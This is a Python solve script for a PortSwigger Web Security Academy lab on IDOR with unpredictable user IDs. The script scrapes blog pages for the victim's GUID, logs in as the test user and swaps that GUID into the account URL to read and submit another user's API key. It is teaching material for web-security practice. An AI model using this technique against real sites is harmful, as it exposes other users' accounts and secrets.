#!/usr/bin/env python3
"""
User ID controlled by request parameter, with unpredictable user IDs
PortSwigger Web Security Academy -- Access Control

Companion script for the writeup: 06-user-id-controlled-unpredictable-user-ids.md

What this does:
    Sweeps the blog listing and every post it links to, regex-matching for a
    GUID-shaped userId parameter appearing near "carlos" on each post's page
    -- author bylines leak the same identifier the account page expects.
    Once carlos's GUID is found, logs in as wiener and swaps it into
    /my-account?id=<guid> to extract and submit carlos's API key.

Usage:
    python 06-user-id-controlled-unpredictable-user-ids.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import httpx


def get_csrf(html: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else ""


def login(client: httpx.Client, base: str, username: str, password: str) -> httpx.Response:
    login_page = client.get(f"{base}/login")
    csrf = get_csrf(login_page.text)
    return client.post(f"{base}/login", data={"csrf": csrf, "username": username, "password": password})


def find_carlos_guid(client: httpx.Client, base: str) -> str | None:
    resp = client.get(base)
    blog_links = re.findall(r'href="(/blogs[^"]*)"', resp.text) or re.findall(r'href="(/post[^"]*)"', resp.text)

    for link in blog_links[:20]:
        try:
            post_resp = client.get(f"{base}{link}")
        except httpx.HTTPError:
            continue
        carlos_match = re.search(r'userId=([a-f0-9-]{36})[^"]*"[^>]*>\s*carlos', post_resp.text, re.IGNORECASE)
        if carlos_match:
            return carlos_match.group(1)
        if "carlos" in post_resp.text.lower():
            guid_match = re.search(r'userId=([a-f0-9-]{36})', post_resp.text)
            if guid_match:
                return guid_match.group(1)

    # Fallback: sweep the blog listing more broadly and confirm ownership per GUID.
    resp = client.get(f"{base}/blog")
    all_matches = re.findall(r'userId=([a-f0-9-]{36})', resp.text)
    for guid in set(all_matches):
        check = client.get(f"{base}/blogs", params={"userId": guid})
        if "carlos" in check.text.lower():
            return guid
    return None


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    carlos_guid = find_carlos_guid(client, lab_url)
    if not carlos_guid:
        print("[-] Could not find carlos's GUID in blog posts.")
        return
    print(f"[+] Carlos GUID: {carlos_guid}")

    login(client, lab_url, "wiener", "peter")

    resp = client.get(f"{lab_url}/my-account", params={"id": carlos_guid})
    print(f"[*] /my-account?id={carlos_guid}: {resp.status_code}")

    key_match = re.search(r'Your API key is:\s*([a-zA-Z0-9]+)', resp.text)
    if not key_match:
        key_match = re.search(r'API [Kk]ey[^<]*?([a-zA-Z0-9]{20,})', resp.text)
    if not key_match:
        key_match = re.search(r'<div[^>]*>([a-zA-Z0-9]{20,})</div>', resp.text)

    if not key_match:
        print("[-] Could not extract API key.")
        return

    api_key = key_match.group(1)
    print(f"[+] Carlos API key: {api_key}")

    resp = client.post(f"{lab_url}/submitSolution", data={"answer": api_key})
    print(f"[*] Submitted: {resp.status_code}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- carlos's API key stolen via GUID-based IDOR.")
    else:
        print("[-] Not solved yet -- confirm the extracted GUID actually belongs to carlos.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
